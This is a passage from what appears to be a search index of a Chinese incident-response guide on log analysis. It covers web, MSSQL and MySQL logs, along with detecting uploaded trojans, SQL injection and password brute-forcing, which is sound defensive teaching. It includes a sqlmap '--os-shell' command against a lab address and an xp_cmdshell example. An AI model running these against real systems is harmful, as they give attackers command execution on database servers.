\u65e5\u5fd7\u5206\u6790\u6280\u5de7"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9AWeb%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x03-\u65e5\u5fd7\u5206\u6790\u6848\u4f8b","text":"Web\u65e5\u5fd7\u5206\u6790\u5b9e\u4f8b\uff1a\u901a\u8fc7nginx\u4ee3\u7406\u8f6c\u53d1\u5230\u5185\u7f51\u67d0\u670d\u52a1\u5668\uff0c\u5185\u7f51\u670d\u52a1\u5668\u67d0\u7ad9\u70b9\u76ee\u5f55\u4e0b\u88ab\u4e0a\u4f20\u4e86\u591a\u4e2a\u56fe\u7247\u6728\u9a6c\uff0c\u867d\u7136II7\u4e0b\u4e0d\u80fd\u89e3\u6790\uff0c\u4f46\u8fd8\u662f\u60f3\u627e\u51fa\u8c01\u901a\u8fc7\u4ec0\u4e48\u8def\u5f84\u4e0a\u4f20\u7684\u3002 \u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u9047\u5230\u4e86\u4e00\u4e2a\u95ee\u9898\uff1a\u7531\u4e8e\u8bbe\u7f6e\u4e86\u4ee3\u7406\u8f6c\u53d1\uff0c\u53ea\u8bb0\u5f55\u4e86\u4ee3\u7406\u670d\u52a1\u5668\u7684ip\uff0c\u5e76\u6ca1\u6709\u8bb0\u5f55\u8bbf\u95ee\u8005IP\uff1f\u8fd9\u65f6\u5019\uff0c\u5982\u4f55\u53bb\u8bc6\u522b\u4e0d\u540c\u7684\u8bbf\u95ee\u8005\u548c\u653b\u51fb\u6e90\u5462\uff1f \u8fd9\u662f\u7ba1\u7406\u5458\u65e5\u5fd7\u914d\u7f6e\u4e0d\u5f53\u7684\u95ee\u9898\uff0c\u4f46\u597d\u5728\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6d4f\u89c8\u5668\u6307\u7eb9\u6765\u5b9a\u4f4d\u4e0d\u540c\u7684\u8bbf\u95ee\u6765\u6e90\uff0c\u8fd8\u539f\u653b\u51fb\u8def\u5f84\u3002 1\u3001\u5b9a\u4f4d\u653b\u51fb\u6e90 \u9996\u5148\u8bbf\u95ee\u56fe\u7247\u6728\u9a6c\u7684\u8bb0\u5f55\uff0c\u53ea\u627e\u5230\u4e86\u4e00\u6761\uff0c\u7531\u4e8e\u6240\u6709\u8bbf\u95ee\u65e5\u5fd7\u53ea\u8bb0\u5f55\u4e86\u4ee3\u7406IP\uff0c\u5e76\u4e0d\u80fd\u901a\u8fc7IP\u6765\u8fd8\u539f\u653b\u51fb\u8def\u5f84\uff0c\u8fd9\u65f6\u5019\uff0c\u53ef\u4ee5\u5229\u7528\u6d4f\u89c8\u5668\u6307\u7eb9\u6765\u5b9a\u4f4d\u3002 \u6d4f\u89c8\u5668\u6307\u7eb9\uff1a Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+.NET4.0C;+.NET4.0E) 2\u3001\u641c\u7d22\u76f8\u5173\u65e5\u5fd7\u8bb0\u5f55 \u901a\u8fc7\u7b5b\u9009\u4e0e\u8be5\u6d4f\u89c8\u5668\u6307\u7eb9\u6709\u5173\u7684\u65e5\u5fd7\u8bb0\u5f55\uff0c\u53ef\u4ee5\u6e05\u6670\u5730\u770b\u5230\u653b\u51fb\u8005\u7684\u653b\u51fb\u8def\u5f84\u3002 3\u3001\u5bf9\u627e\u5230\u7684\u8bbf\u95ee\u65e5\u5fd7\u8fdb\u884c\u89e3\u8bfb\uff0c\u653b\u51fb\u8005\u5927\u81f4\u7684\u8bbf\u95ee\u8def\u5f84\u5982\u4e0b\uff1a A\u3001\u653b\u51fb\u8005\u8bbf\u95ee\u9996\u9875\u548c\u767b\u5f55\u9875 B\u3001\u653b\u51fb\u8005\u8bbf\u95eeMsgSjlb.aspx\u548cMsgSebd.aspx C\u3001\u653b\u51fb\u8005\u8bbf\u95eeXzuser.aspx D\u3001\u653b\u51fb\u8005\u591a\u6b21POST\uff08\u6000\u7591\u901a\u8fc7\u8fd9\u4e2a\u9875\u9762\u4e0a\u4f20\u6a21\u5757\u7f3a\u9677\uff09 E\u3001\u653b\u51fb\u8005\u8bbf\u95ee\u4e86\u56fe\u7247\u6728\u9a6c \u6253\u5f00\u7f51\u7ad9\uff0c\u8bbf\u95eeXzuser.aspx\uff0c\u786e\u8ba4\u653b\u51fb\u8005\u901a\u8fc7\u8be5\u9875\u9762\u7684\u8fdb\u884c\u6587\u4ef6\u4e0a\u4f20\u4e86\u56fe\u7247\u6728\u9a6c\uff0c\u540c\u65f6\uff0c\u53d1\u73b0\u7f51\u7ad9\u4e86\u5b58\u5728\u8d8a\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u8bbf\u95ee\u7279\u5b9aURL\uff0c\u65e0\u9700\u767b\u5f55\u5373\u53ef\u8fdb\u5165\u540e\u53f0\u754c\u9762\u3002\u901a\u8fc7\u65e5\u5fd7\u5206\u6790\u627e\u5230\u7f51\u7ad9\u7684\u6f0f\u6d1e\u4f4d\u7f6e\u5e76\u8fdb\u884c\u4fee\u590d\u3002","title":"0x03 \u65e5\u5fd7\u5206\u6790\u6848\u4f8b"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC3%E7%AF%87%EF%BC%9AWeb%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x04-\u65e5\u5fd7\u7edf\u8ba1\u5206\u6790\u6280\u5de7","text":"\u7edf\u8ba1\u722c\u866b\uff1a grep - E 'Googlebot|Baiduspider' / www / logs / access .2019 - 02 - 23. log | awk '{ print $1 }' | sort | uniq \u7edf\u8ba1\u6d4f\u89c8\u5668\uff1a cat / www / logs / access .2019 - 02 - 23. log | grep - v - E 'MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon' | sort | uniq - c | sort - r - n | head - n 100 IP \u7edf\u8ba1\uff1a grep '23/May/2019' / www / logs / access .2019 - 02 - 23. log | awk '{print $1}' | awk - F '.' '{print $1\".\"$2\".\"$3\".\"$4}' | sort | uniq - c | sort - r - n | head - n 10 2206 219.136.134.13 1497 182.34.15.248 1431 211.140.143.100 1431 119.145.149.106 1427 61.183.15.179 1427 218.6.8.189 1422 124.232.150.171 1421 106.187.47.224 1420 61.160.220.252 1418 114.80.201.18 \u7edf\u8ba1\u7f51\u6bb5\uff1a cat / www / logs / access .2019 - 02 - 23. log | awk '{print $1}' | awk - F '.' '{print $1\".\"$2\".\"$3\".0\"}' | sort | uniq - c | sort - r - n | head - n 200 \u7edf\u8ba1\u57df\u540d\uff1a cat / www / logs / access .2019 - 02 - 23. log | awk '{print $2}' | sort | uniq - c | sort - rn | more HTTP Status\uff1a cat / www / logs / access .2019 - 02 - 23. log | awk '{print $9}' | sort | uniq - c | sort - rn | more 5056585 304 1125579 200 7602 400 5 301 URL \u7edf\u8ba1\uff1a cat / www / logs / access .2019 - 02 - 23. log | awk '{print $7}' | sort | uniq - c | sort - rn | more \u6587\u4ef6\u6d41\u91cf\u7edf\u8ba1\uff1a cat / www / logs / access .2019 - 02 - 23. log | awk '{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}' | sort - rn | more grep ' 200 ' / www / logs / access .2019 - 02 - 23. log | awk '{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}' | sort - rn | more URL\u8bbf\u95ee\u91cf\u7edf\u8ba1\uff1a cat / www / logs / access .2019 - 02 - 23. log | awk '{print $7}' | egrep '\\?|&' | sort | uniq - c | sort - rn | more \u811a\u672c\u8fd0\u884c\u901f\u5ea6\uff1a \u67e5\u51fa\u8fd0\u884c\u901f\u5ea6\u6700\u6162\u7684\u811a\u672c grep - v 0 $ / www / logs / access .2019 - 02 - 23. log | awk - F '\\\" ' '{print $4\" \" $1}' web . log | awk '{print $1\" \"$8}' | sort - n - k 1 - r | uniq > /tmp/slow_url.txt IP, URL \u62bd\u53d6\uff1a # tail - f / www / logs / access .2019 - 02 - 23. log | grep '/test.html' | awk '{print $1\" \"$7}'","title":"0x04 \u65e5\u5fd7\u7edf\u8ba1\u5206\u6790\u6280\u5de7"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC4%E7%AF%87%EF%BC%9AMSSQL%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/","text":"\u7b2c4\u7bc7:MSSQL\u65e5\u5fd7\u5206\u6790 \u00b6 \u5e38\u89c1\u7684\u6570\u636e\u5e93\u653b\u51fb\u5305\u62ec\u5f31\u53e3\u4ee4\u3001SQL\u6ce8\u5165\u3001\u63d0\u5347\u6743\u9650\u3001\u7a83\u53d6\u5907\u4efd\u7b49\u3002\u5bf9\u6570\u636e\u5e93\u65e5\u5fd7\u8fdb\u884c\u5206\u6790\uff0c\u53ef\u4ee5\u53d1\u73b0\u653b\u51fb\u884c\u4e3a\uff0c\u8fdb\u4e00\u6b65\u8fd8\u539f\u653b\u51fb\u573a\u666f\u53ca\u8ffd\u6eaf\u653b\u51fb\u6e90\u3002 0x01 MSSQL\u65e5\u5fd7\u5206\u6790 \u00b6 \u9996\u5148\uff0cMSSQL\u6570\u636e\u5e93\u5e94\u542f\u7528\u65e5\u5fd7\u8bb0\u5f55\u529f\u80fd\uff0c\u9ed8\u8ba4\u914d\u7f6e\u4ec5\u9650\u5931\u8d25\u7684\u767b\u5f55\uff0c\u9700\u4fee\u6539\u4e3a\u5931\u8d25\u548c\u6210\u529f\u7684\u767b\u5f55\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5bf9\u7528\u6237\u767b\u5f55\u8fdb\u884c\u5ba1\u6838\u3002 \u767b\u5f55\u5230SQL Server Management Studio\uff0c\u4f9d\u6b21\u70b9\u51fb \u7ba1\u7406--SQL Server \u65e5\u5fd7 \u53cc\u51fb\u65e5\u5fd7\u5b58\u6863\u6587\u4ef6\u5373\u53ef\u6253\u5f00\u65e5\u5fd7\u6587\u4ef6\u67e5\u770b\u5668\uff0c\u5e76\u53ef\u4ee5\u5bf9\u65e5\u5fd7\u8fdb\u884c\u7b5b\u9009\u6216\u8005\u5bfc\u51fa\u7b49\u64cd\u4f5c\u3002 \u53e6\u5916\uff0cMSSQ\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5de5\u5177SQL Server Profiler \uff0c\u65b9\u4fbf\u67e5\u627e\u548c\u53d1\u73b0SQL\u6267\u884c\u7684\u6548\u7387\u548c\u8bed\u53e5\u95ee\u9898\u3002 \u65e5\u5fd7\u5206\u6790\u6848\u4f8b\uff1a \u5728\u65e5\u5fd7\u6587\u4ef6\u67e5\u770b\u5668\u4e2d\uff0c\u9009\u62e9\u7b5b\u9009\uff0c\u5728\u7b5b\u9009\u8bbe\u7f6e\u4e2d\u6e90\u8bbe\u7f6e\u4e3a\u201c\u767b\u5f55\u201d\uff0c\u5e94\u7528\u7b5b\u9009\u5668\uff0c\u786e\u5b9a\u3002 \u7b5b\u9009\u540e\u7684\u7ed3\u679c\uff0c\u53ef\u4ee5\u5f88\u6e05\u6670\u7684\u8bc6\u522b\u7528\u6237\u767b\u5f55\u4fe1\u606f\uff0c\u8bb0\u5f55\u5185\u5bb9\u5305\u62ec\u7528\u6237\u767b\u5f55\u65f6\u95f4\u3001\u767b\u5f55\u662f\u5426\u6210\u529f\u3001\u767b\u5f55\u4f7f\u7528\u7684\u8d26\u53f7\u4ee5\u53ca\u8fdc\u7a0b\u767b\u5f55\u65f6\u7528\u6237\u4f7f\u7528\u7684IP\u5730\u5740\u3002 \u5982\u4e0b\u56fe\uff1a\u5ba2\u6237\u7aef\uff1a192.168.204.1\u8fdb\u884c\u5c1d\u8bd5\u5f31\u53e3\u4ee4\u767b\u5f55\uff0c\u5e76\u53d1\u73b0\u5176\u4e2d\u6709\u4e00\u6761\u767b\u5f55\u6210\u529f\u7684\u8bb0\u5f55\u3002 0x02 SQL\u6ce8\u5165\u5165\u4fb5\u75d5\u8ff9 \u00b6 \u5728\u5229\u7528SQL\u6ce8\u5165\u6f0f\u6d1e\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u4f1a\u5c1d\u8bd5\u5229\u7528sqlmap\u7684--os-shell\u53c2\u6570\u53d6\u5f97shell\uff0c\u5982\u64cd\u4f5c\u4e0d\u614e\uff0c\u53ef\u80fd\u7559\u4e0b\u4e00\u4e9bsqlmap\u521b\u5efa\u7684\u4e34\u65f6\u8868\u548c\u81ea\u5b9a\u4e49\u51fd\u6570\u3002\u6211\u4eec\u5148\u6765\u770b\u4e00\u4e0bsqlmap os-shell\u53c2\u6570\u7684\u7528\u6cd5\u4ee5\u53ca\u539f\u7406\uff1a 1\u3001\u6784\u9020\u4e00\u4e2aSQL\u6ce8\u5165\u70b9\uff0c\u5f00\u542fBurp\u76d1\u542c8080\u7aef\u53e3 sqlmap.py -u http://192.168.204.164/sql.asp?id=1 --os-shell --proxy=http://127.0.0.1:8080 HTTP\u901a\u8baf\u8fc7\u7a0b\u5982\u4e0b\uff1a \u521b\u5efa\u4e86\u4e00\u4e2a\u4e34\u65f6\u8868sqlmapoutput\uff0c\u8c03\u7528\u5b58\u50a8\u8fc7\u7a0b\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u5c06\u6570\u636e\u5199\u5165\u4e34\u65f6\u8868\uff0c\u7136\u540e\u53d6\u4e34\u65f6\u8868\u4e2d\u7684\u6570\u636e\u5c55\u793a\u5230\u524d\u7aef\u3002 \u901a\u8fc7\u67e5\u770b\u6570\u636e\u5e93\u4e2d\u6700\u8fd1\u65b0\u5efa\u7684\u8868\u7684\u7ed3\u6784\u548c\u5185\u5bb9\uff0c\u53ef\u4ee5\u5224\u65ad\u662f\u5426\u53d1\u751f\u8fc7sql\u6ce8\u5165\u6f0f\u6d1e\u653b\u51fb\u4e8b\u4ef6\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a 1\u3001\u6570\u636e\u5e93\u8868\u68c0\u67e5 2\u3001\u68c0\u67e5xp_cmdshell\u7b49\u5b58\u50a8\u8fc7\u7a0b xp_cmdshell\u5728mssql2005\u4e4b\u540e\u7684\u7248\u672c\u4e2d\u662f\u9ed8\u8ba4\u7981\u6b62\u7684\uff0c\u67e5\u770bxp_cmdshell\u662f\u5426\u88ab\u542f\u7528\u3002 `Exec master.dbo.xp_cmdshell 'whoami' 3\u3001\u9700\u8981\u7ed3\u5408web\u65e5\u5fd7\uff0c\u901a\u8fc7\u67e5\u770b\u65e5\u5fd7\u6587\u4ef6\u7684\u5927\u5c0f\u4ee5\u53ca\u5ba1\u8ba1\u65e5\u5fd7\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u5224\u65ad\u662f\u5426\u53d1\u751f\u8fc7sql\u6ce8\u5165\u6f0f\u6d1e\u653b\u51fb\u4e8b\u4ef6\u3002","title":"\u7b2c4\u7bc7\uff1aMSSQL\u65e5\u5fd7\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC4%E7%AF%87%EF%BC%9AMSSQL%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#\u7b2c4\u7bc7mssql\u65e5\u5fd7\u5206\u6790","text":"\u5e38\u89c1\u7684\u6570\u636e\u5e93\u653b\u51fb\u5305\u62ec\u5f31\u53e3\u4ee4\u3001SQL\u6ce8\u5165\u3001\u63d0\u5347\u6743\u9650\u3001\u7a83\u53d6\u5907\u4efd\u7b49\u3002\u5bf9\u6570\u636e\u5e93\u65e5\u5fd7\u8fdb\u884c\u5206\u6790\uff0c\u53ef\u4ee5\u53d1\u73b0\u653b\u51fb\u884c\u4e3a\uff0c\u8fdb\u4e00\u6b65\u8fd8\u539f\u653b\u51fb\u573a\u666f\u53ca\u8ffd\u6eaf\u653b\u51fb\u6e90\u3002","title":"\u7b2c4\u7bc7:MSSQL\u65e5\u5fd7\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC4%E7%AF%87%EF%BC%9AMSSQL%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x01-mssql\u65e5\u5fd7\u5206\u6790","text":"\u9996\u5148\uff0cMSSQL\u6570\u636e\u5e93\u5e94\u542f\u7528\u65e5\u5fd7\u8bb0\u5f55\u529f\u80fd\uff0c\u9ed8\u8ba4\u914d\u7f6e\u4ec5\u9650\u5931\u8d25\u7684\u767b\u5f55\uff0c\u9700\u4fee\u6539\u4e3a\u5931\u8d25\u548c\u6210\u529f\u7684\u767b\u5f55\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5bf9\u7528\u6237\u767b\u5f55\u8fdb\u884c\u5ba1\u6838\u3002 \u767b\u5f55\u5230SQL Server Management Studio\uff0c\u4f9d\u6b21\u70b9\u51fb \u7ba1\u7406--SQL Server \u65e5\u5fd7 \u53cc\u51fb\u65e5\u5fd7\u5b58\u6863\u6587\u4ef6\u5373\u53ef\u6253\u5f00\u65e5\u5fd7\u6587\u4ef6\u67e5\u770b\u5668\uff0c\u5e76\u53ef\u4ee5\u5bf9\u65e5\u5fd7\u8fdb\u884c\u7b5b\u9009\u6216\u8005\u5bfc\u51fa\u7b49\u64cd\u4f5c\u3002 \u53e6\u5916\uff0cMSSQ\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5de5\u5177SQL Server Profiler \uff0c\u65b9\u4fbf\u67e5\u627e\u548c\u53d1\u73b0SQL\u6267\u884c\u7684\u6548\u7387\u548c\u8bed\u53e5\u95ee\u9898\u3002 \u65e5\u5fd7\u5206\u6790\u6848\u4f8b\uff1a \u5728\u65e5\u5fd7\u6587\u4ef6\u67e5\u770b\u5668\u4e2d\uff0c\u9009\u62e9\u7b5b\u9009\uff0c\u5728\u7b5b\u9009\u8bbe\u7f6e\u4e2d\u6e90\u8bbe\u7f6e\u4e3a\u201c\u767b\u5f55\u201d\uff0c\u5e94\u7528\u7b5b\u9009\u5668\uff0c\u786e\u5b9a\u3002 \u7b5b\u9009\u540e\u7684\u7ed3\u679c\uff0c\u53ef\u4ee5\u5f88\u6e05\u6670\u7684\u8bc6\u522b\u7528\u6237\u767b\u5f55\u4fe1\u606f\uff0c\u8bb0\u5f55\u5185\u5bb9\u5305\u62ec\u7528\u6237\u767b\u5f55\u65f6\u95f4\u3001\u767b\u5f55\u662f\u5426\u6210\u529f\u3001\u767b\u5f55\u4f7f\u7528\u7684\u8d26\u53f7\u4ee5\u53ca\u8fdc\u7a0b\u767b\u5f55\u65f6\u7528\u6237\u4f7f\u7528\u7684IP\u5730\u5740\u3002 \u5982\u4e0b\u56fe\uff1a\u5ba2\u6237\u7aef\uff1a192.168.204.1\u8fdb\u884c\u5c1d\u8bd5\u5f31\u53e3\u4ee4\u767b\u5f55\uff0c\u5e76\u53d1\u73b0\u5176\u4e2d\u6709\u4e00\u6761\u767b\u5f55\u6210\u529f\u7684\u8bb0\u5f55\u3002","title":"0x01 MSSQL\u65e5\u5fd7\u5206\u6790"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC4%E7%AF%87%EF%BC%9AMSSQL%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x02--sql\u6ce8\u5165\u5165\u4fb5\u75d5\u8ff9","text":"\u5728\u5229\u7528SQL\u6ce8\u5165\u6f0f\u6d1e\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u4f1a\u5c1d\u8bd5\u5229\u7528sqlmap\u7684--os-shell\u53c2\u6570\u53d6\u5f97shell\uff0c\u5982\u64cd\u4f5c\u4e0d\u614e\uff0c\u53ef\u80fd\u7559\u4e0b\u4e00\u4e9bsqlmap\u521b\u5efa\u7684\u4e34\u65f6\u8868\u548c\u81ea\u5b9a\u4e49\u51fd\u6570\u3002\u6211\u4eec\u5148\u6765\u770b\u4e00\u4e0bsqlmap os-shell\u53c2\u6570\u7684\u7528\u6cd5\u4ee5\u53ca\u539f\u7406\uff1a 1\u3001\u6784\u9020\u4e00\u4e2aSQL\u6ce8\u5165\u70b9\uff0c\u5f00\u542fBurp\u76d1\u542c8080\u7aef\u53e3 sqlmap.py -u http://192.168.204.164/sql.asp?id=1 --os-shell --proxy=http://127.0.0.1:8080 HTTP\u901a\u8baf\u8fc7\u7a0b\u5982\u4e0b\uff1a \u521b\u5efa\u4e86\u4e00\u4e2a\u4e34\u65f6\u8868sqlmapoutput\uff0c\u8c03\u7528\u5b58\u50a8\u8fc7\u7a0b\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u5c06\u6570\u636e\u5199\u5165\u4e34\u65f6\u8868\uff0c\u7136\u540e\u53d6\u4e34\u65f6\u8868\u4e2d\u7684\u6570\u636e\u5c55\u793a\u5230\u524d\u7aef\u3002 \u901a\u8fc7\u67e5\u770b\u6570\u636e\u5e93\u4e2d\u6700\u8fd1\u65b0\u5efa\u7684\u8868\u7684\u7ed3\u6784\u548c\u5185\u5bb9\uff0c\u53ef\u4ee5\u5224\u65ad\u662f\u5426\u53d1\u751f\u8fc7sql\u6ce8\u5165\u6f0f\u6d1e\u653b\u51fb\u4e8b\u4ef6\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a 1\u3001\u6570\u636e\u5e93\u8868\u68c0\u67e5 2\u3001\u68c0\u67e5xp_cmdshell\u7b49\u5b58\u50a8\u8fc7\u7a0b xp_cmdshell\u5728mssql2005\u4e4b\u540e\u7684\u7248\u672c\u4e2d\u662f\u9ed8\u8ba4\u7981\u6b62\u7684\uff0c\u67e5\u770bxp_cmdshell\u662f\u5426\u88ab\u542f\u7528\u3002 `Exec master.dbo.xp_cmdshell 'whoami' 3\u3001\u9700\u8981\u7ed3\u5408web\u65e5\u5fd7\uff0c\u901a\u8fc7\u67e5\u770b\u65e5\u5fd7\u6587\u4ef6\u7684\u5927\u5c0f\u4ee5\u53ca\u5ba1\u8ba1\u65e5\u5fd7\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u5224\u65ad\u662f\u5426\u53d1\u751f\u8fc7sql\u6ce8\u5165\u6f0f\u6d1e\u653b\u51fb\u4e8b\u4ef6\u3002","title":"0x02  SQL\u6ce8\u5165\u5165\u4fb5\u75d5\u8ff9"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC02%E7%AB%A0%EF%BC%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AF%87/%E7%AC%AC5%E7%AF%87%EF%BC%9AMySQL%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/","text":"\u7b2c5\u7bc7:MySQL\u65e5\u5fd7\u5206\u6790 \u00b6 \u5e38\u89c1\u7684\u6570\u636e\u5e93\u653b\u51fb\u5305\u62ec\u5f31\u53e3\u4ee4\u3001SQL\u6ce8\u5165\u3001\u63d0\u5347\u6743\u9650\u3001\u7a83\u53d6\u5907\u4efd\u7b49\u3002\u5bf9\u6570\u636e\u5e93\u65e5\u5fd7\u8fdb\u884c\u5206\u6790\uff0c\u53ef\u4ee5\u53d1\u73b0\u653b\u51fb\u884c\u4e3a\uff0c\u8fdb\u4e00\u6b65\u8fd8\u539f\u653b\u51fb\u573a\u666f\u53ca\u8ffd\u6eaf\u653b\u51fb\u6e90\u3002 0x01 Mysql\u65e5\u5fd7\u5206\u6790 \u00b6 general query log\u80fd\u8bb0\u5f55\u6210\u529f\u8fde\u63a5\u548c\u6bcf\u6b21\u6267\u884c\u7684\u67e5\u8be2\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5b83\u7528\u4f5c\u5b89\u5168\u5e03\u9632\u7684\u4e00\u90e8\u5206\uff0c\u4e3a\u6545\u969c\u5206\u6790\u6216\u9ed1\u5ba2\u4e8b\u4ef6\u540e\u7684\u8c03\u67e5\u63d0\u4f9b\u4f9d\u636e\u3002 1\u3001\u67e5\u770blog\u914d\u7f6e\u4fe1\u606f show variables like '%general%'; 2\u3001\u5f00\u542f\u65e5\u5fd7 SET GLOBAL general_log = 'On'; 3\u3001\u6307\u5b9a\u65e5\u5fd7\u6587\u4ef6\u8def\u5f84 #SET GLOBAL general_log_file = '/var/lib/mysql/mysql.log'; \u6bd4\u5982\uff0c\u5f53\u6211\u8bbf\u95ee /test.php?id=1\uff0c\u6b64\u65f6\u6211\u4eec\u5f97\u5230\u8fd9\u6837\u7684\u65e5\u5fd7\uff1a 190604 14:46:14 14 Connect root@localhost on 14 Init DB test 14 Query SELECT * FROM admin WHERE id = 1 14 Quit ` \u6211\u4eec\u6309\u5217\u6765\u89e3\u6790\u4e00\u4e0b\uff1a \u7b2c\u4e00\u5217:Time\uff0c\u65f6\u95f4\u5217\uff0c\u524d\u9762\u4e00\u4e2a\u662f\u65e5\u671f,\u540e\u9762\u4e00\u4e2a\u662f\u5c0f\u65f6\u548c\u5206\u949f\uff0c\u6709\u4e00\u4e9b\u4e0d\u663e\u793a\u7684\u539f\u56e0\u662f\u56e0\u4e3a\u8fd9\u4e9bsql\u8bed\u53e5\u51e0\u4e4e\u662f\u540c\u65f6\u6267\u884c\u7684,\u6240\u4ee5\u5c31\u4e0d\u53e6\u5916\u8bb0\u5f55\u65f6\u95f4\u4e86\u3002 \u7b2c\u4e8c\u5217:Id\uff0c\u5c31\u662fshow processlist\u51fa\u6765\u7684\u7b2c\u4e00\u5217\u7684\u7ebf\u7a0bID,\u5bf9\u4e8e\u957f\u8fde\u63a5\u548c\u4e00\u4e9b\u6bd4\u8f83\u8017\u65f6\u7684sql\u8bed\u53e5,\u4f60\u53ef\u4ee5\u7cbe\u786e\u627e\u51fa\u7a76\u7adf\u662f\u90a3\u4e00\u6761\u90a3\u4e00\u4e2a\u7ebf\u7a0b\u5728\u8fd0\u884c\u3002 \u7b2c\u4e09\u5217:Command\uff0c\u64cd\u4f5c\u7c7b\u578b\uff0c\u6bd4\u5982Connect\u5c31\u662f\u8fde\u63a5\u6570\u636e\u5e93\uff0cQuery\u5c31\u662f\u67e5\u8be2\u6570\u636e\u5e93(\u589e\u5220\u67e5\u6539\u90fd\u663e\u793a\u4e3a\u67e5\u8be2)\uff0c\u53ef\u4ee5\u7279\u5b9a\u8fc7\u8651\u4e00\u4e9b\u64cd\u4f5c\u3002 \u7b2c\u56db\u5217:Argument\uff0c\u8be6\u7ec6\u4fe1\u606f\uff0c\u4f8b\u5982 Connect root@localhost on \u610f\u601d\u5c31\u662f\u8fde\u63a5\u6570\u636e\u5e93\uff0c\u5982\u6b64\u7c7b\u63a8,\u63a5\u4e0b\u9762\u7684\u8fde\u4e0a\u6570\u636e\u5e93\u4e4b\u540e,\u505a\u4e86\u4ec0\u4e48\u67e5\u8be2\u7684\u64cd\u4f5c\u3002 0x02 \u767b\u5f55\u6210\u529f/\u5931\u8d25 \u00b6 \u6211\u4eec\u6765\u505a\u4e2a\u7b80\u5355\u7684\u6d4b\u8bd5\u5427\uff0c\u4f7f\u7528\u6211\u4ee5\u524d\u81ea\u5df1\u5f00\u53d1\u7684\u5f31\u53e3\u4ee4\u5de5\u5177\u6765\u626b\u4e00\u4e0b\uff0c\u5b57\u5178\u8bbe\u7f6e\u6bd4\u8f83\u5c0f\uff0c2\u4e2a\u7528\u6237\uff0c4\u4e2a\u5bc6\u7801\uff0c\u51718\u7ec4\u3002 MySQL\u4e2d\u7684log\u8bb0\u5f55\u662f\u8fd9\u6837\u5b50\uff1a Time Id Command Argument 190601 22:03:20 98 Connect root@192.168.204.1 on 98 Connect Access denied for user 'root'@'192.168.204.1' (using password: YES) 103 Connect mysql@192.168.204.1 on 103 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) 104 Connect mysql@192.168.204.1 on 104 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) 100 Connect root@192.168.204.1 on 101 Connect root@192.168.204.1 on 101 Connect Access denied for user 'root'@'192.168.204.1' (using password: YES) 99 Connect root@192.168.204.1 on 99 Connect Access denied for user 'root'@'192.168.204.1' (using password: YES) 105 Connect mysql@192.168.204.1 on 105 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) 100 Query set autocommit=0 102 Connect mysql@192.168.204.1 on 102 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) 100 Quit ` \u4f60\u77e5\u9053\u5728\u8fd9\u4e2a\u53e3\u4ee4\u731c\u89e3\u8fc7\u7a0b\u4e2d\uff0c\u54ea\u4e2a\u662f\u6210\u529f\u7684\u5417\uff1f \u5229\u7528\u7206\u7834\u5de5\u5177\uff0c\u4e00\u4e2a\u53e3\u4ee4\u731c\u89e3\u6210\u529f\u7684\u8bb0\u5f55\u662f\u8fd9\u6837\u5b50\u7684\uff1a 190601 22:03:20 100 Connect root@192.168.204.1 on 100 Query set 